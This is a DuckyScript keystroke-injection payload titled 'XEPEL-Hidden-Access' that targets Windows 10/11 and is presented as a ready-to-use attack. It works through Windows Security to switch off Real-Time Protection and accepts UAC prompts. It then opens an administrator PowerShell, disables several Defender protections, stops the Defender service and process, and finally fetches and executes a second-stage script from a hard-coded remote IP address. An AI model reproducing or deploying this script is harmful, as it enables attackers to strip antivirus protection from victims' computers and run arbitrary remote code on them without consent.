REM Title: XEPEL-Hidden-Access
REM Author: XEPEL
REM Description: Force scroll top, precise RT protection toggle, admin PS execution
REM Target: Windows 10/11

REM ── Step 1: Open Windows Security ──
GUI
DELAY 500
STRING windows security
DELAY 500
ENTER
DELAY 2000

REM ── Step 2: Virus and Threat Protection ──
ENTER
DELAY 1000

REM ── Step 3: Manage Settings ──
TAB
TAB
TAB
DELAY 300
ENTER
DELAY 1500

REM ── Step 4: Force page to top ──
CTRL HOME
DELAY 300

REM ── Step 5: TAB once to land on Real Time Protection toggle ──
TAB
DELAY 500

REM ── Step 6: Toggle off ──
SPACE
DELAY 800

REM ── Step 7: UAC Yes ──
LEFT
ENTER
DELAY 2000

REM ── Step 8: Close Windows Security ──
ALT F4
DELAY 800

REM ── Step 9: Open PowerShell as admin ──
GUI r
DELAY 800
STRING powershell
DELAY 300
CTRL SHIFT ENTER
DELAY 2000

REM ── Step 10: UAC Yes for PowerShell ──
LEFT
ENTER
DELAY 2000

REM ── Step 11: Kill remaining Defender processes from admin PS ──
STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
DELAY 500
STRINGLN Stop-Service WinDefend -Force
DELAY 500
STRINGLN Stop-Process -Name MsMpEng -Force
DELAY 500

REM ── Step 12: Pull and execute stage2.ps1 from VPS ──
STRINGLN IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
DELAY 500
